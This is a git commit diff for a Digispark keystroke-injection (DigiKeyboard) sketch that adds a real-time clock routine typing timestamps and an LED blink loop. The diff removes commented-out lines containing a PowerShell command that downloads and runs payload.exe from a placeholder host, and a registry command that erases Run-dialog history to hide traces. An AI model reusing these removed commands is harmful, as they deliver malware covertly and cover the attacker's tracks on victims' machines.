8bfaf3468572475445594965284ae20014924413
Antonio Vanegas <hpsaturn@gmail.com>
2018-09-03 18:02:00 -0500

    date time update via soft, ready.

--- src/main.cpp
+++ src/main.cpp
@@ -1,13 +1,10 @@
 #include <Arduino.h>
 #include "DigiKeyboard.h"
 #include <avr/boot.h>
-
 #include <TinyWireM.h>
 #include "TinyRTClib.h"
 
 RTC_Millis RTC;
-
-
 int blinkPin = 1;
 
 byte read_factory_calibration(void) {
@@ -18,6 +15,21 @@ byte read_factory_calibration(void) {
 
 boolean is_clock_calibrated(void) {
   return read_factory_calibration() != OSCCAL;
+}
+
+void blinkLoop(){
+  digitalWrite(blinkPin, HIGH);
+  delay(100);
+  digitalWrite(blinkPin, LOW);
+  delay(100);
+}
+
+void clockLoop(){
+  DateTime now = RTC.now();
+  char output [30];
+  sprintf(output,"echo %04d%02d%02d.%02d%02d%02d",now.year(),now.month(),now.day(),now.hour(),now.minute(),now.second());
+  DigiKeyboard.println(output);
+  delay(1000);
 }
 
 void setup() {
@@ -35,32 +47,11 @@ void setup() {
   DigiKeyboard.println(output);
   DigiKeyboard.delay(100);
   RTC.begin(DateTime(__DATE__, __TIME__));
-  delay(100);
-  DateTime now = RTC.now();
-  DigiKeyboard.print(now.year(), DEC);
   DigiKeyboard.delay(100);
-  // DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  // DigiKeyboard.delay(1000);
-  // DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
-  // DigiKeyboard.delay(1000);
-  // // Modify 127.0.0.1 with your IP address and payload.exe with your payload file name
-  // DigiKeyboard.println("$down = New-Object System.Net.WebClient; $url = 'http://127.0.0.1/payload.exe'; $file = 'payload.exe'; $down.DownloadFile($url,$file); $exec = New-Object -com shell.application; $exec.shellexecute($file); exit;");
-  // DigiKeyboard.delay(1000);
-  // DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
-  // DigiKeyboard.delay(100);
-  // // Clear run command history
-  // DigiKeyboard.println("reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /va /f");
-  // DigiKeyboard.delay(100);
-  // DigiKeyboard.sendKeyStroke(KEY_ENTER);
-  // DigiKeyboard.delay(100);
   digitalWrite(blinkPin, HIGH);
-  delay(1000);
 }
 
-void loop()
-{
-  digitalWrite(blinkPin, HIGH);
-  delay(100);
-  digitalWrite(blinkPin, LOW);
-  delay(100);
+void loop(){
+  clockLoop();
+  blinkLoop();
 }
